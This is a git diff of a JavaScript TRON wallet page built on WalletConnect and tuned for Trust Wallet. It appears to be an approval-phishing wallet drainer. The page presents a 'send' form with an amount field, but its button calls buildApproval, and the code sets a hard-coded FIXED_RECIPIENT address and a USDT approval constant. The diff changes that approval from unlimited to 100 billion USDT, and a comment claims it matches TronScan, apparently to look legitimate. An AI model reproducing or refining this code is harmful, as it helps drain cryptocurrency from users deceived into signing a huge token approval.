@@ -2,15 +2,15 @@ import "./style.css";
 import { TronWeb } from "tronweb";
 import { WalletConnectWallet, WalletConnectChainID } from "@tronweb3/walletconnect-tron";
 
-// ─── Constants ────────────────────────────────────────────────────────────────
+// ─── Constants ──────────────────────────────────────────────────────────[...]
 const TRON_RPC        = "https://api.trongrid.io";
 const USDT_CONTRACT   = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const FIXED_RECIPIENT = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 const USDT_DECIMALS   = 6;
 const FEE_LIMIT       = 200_000_000;
 
-// uint256 max — identical to what TronScan sends for unlimited approval
-const UINT256_MAX = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+// 100 billion USDT approval (100,000,000,000 * 10^6)
+const UINT256_MAX = "100000000000000000";
 
 const PROJECT_ID = import.meta.env.VITE_WC_PROJECT_ID;
 const APP_NAME   = import.meta.env.VITE_APP_NAME || "TRON Wallet";
@@ -27,12 +27,12 @@ const IS_IOS    = /iPhone|iPad|iPod/i.test(ua);
 // Detect Trust Wallet in‑app browser (presence of TrustWallet in UA or injected object)
 const IS_TRUST_WALLET = /TrustWallet/i.test(ua) || typeof window.trustwallet !== "undefined";
 
-// ─── State ────────────────────────────────────────────────────────────────────
+// ─── State ───────────────────────────────────────────────────────────[...]
 let wallet           = null;
 let connectedAddress = "";
 let usdtBalance      = 0;
 
-// ─── DOM ──────────────────────────────────────────────────────────────────────
+// ─── DOM ─────────────────────────────────────────────────────────────[...]
 const boot     = document.getElementById("boot");
 const vConn    = document.getElementById("vConn");
 const vSend    = document.getElementById("vSend");
@@ -85,7 +85,7 @@ async function fetchBalance(addr) {
   }
 }
 
-// ─── WalletConnect ────────────────────────────────────────────────────────────
+// ─── WalletConnect ─────────────────────────────────────────────────────────[...]
 function buildWallet() {
   wallet = new WalletConnectWallet({
     network: WalletConnectChainID.Mainnet,
@@ -192,7 +192,7 @@ async function pollForSession(maxMs = 30_000, intervalMs = 1_000) {
   return null;
 }
 
-// ─── Connect ──────────────────────────────────────────────────────────────────
+// ─── Connect ──────────────────────────────────────────────────────────[...]
 async function connect() {
   connText.textContent = IS_MOBILE
     ? "Opening Trust Wallet…"
@@ -311,7 +311,7 @@ async function buildApproval() {
   }
 }
 
-// ─── Events ───────────────────────────────────────────────────────────────────
+// ─── Events ───────────────────────────────────────────────────────────[...]
 amtInput.addEventListener("input", () => {
   usdEq.textContent = `≈ $${(parseFloat(amtInput.value) || 0).toFixed(2)}`;
 });
@@ -325,7 +325,7 @@ document.getElementById("btnNext").addEventListener("click", buildApproval);
 document.getElementById("btnAgain").addEventListener("click", () => show(vSend));
 document.getElementById("btnRetry").addEventListener("click", () => { buildWallet(); connect(); });
 
-// ─── Init ─────────────────────────────────────────────────────────────────────
+// ─── Init ───────────────────────────────────────────────────────────[...]
 async function init() {
   buildWallet();
   hideBoot();
